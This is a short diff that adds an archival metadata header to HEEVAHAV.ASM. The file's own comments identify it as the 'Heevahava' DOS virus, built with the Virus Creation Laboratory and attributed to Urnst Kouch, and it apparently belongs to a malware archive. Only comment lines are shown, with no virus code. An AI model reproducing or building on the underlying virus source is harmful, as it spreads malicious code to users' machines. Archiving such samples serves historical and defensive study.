@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      H
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ; HEEVAHAV.ASM -- HEEVAHAVA VIRUS
 ; Created with Nowhere Man's Virus Creation Laboratory v1.00/TASM
 ; Written by URNST KOUCH
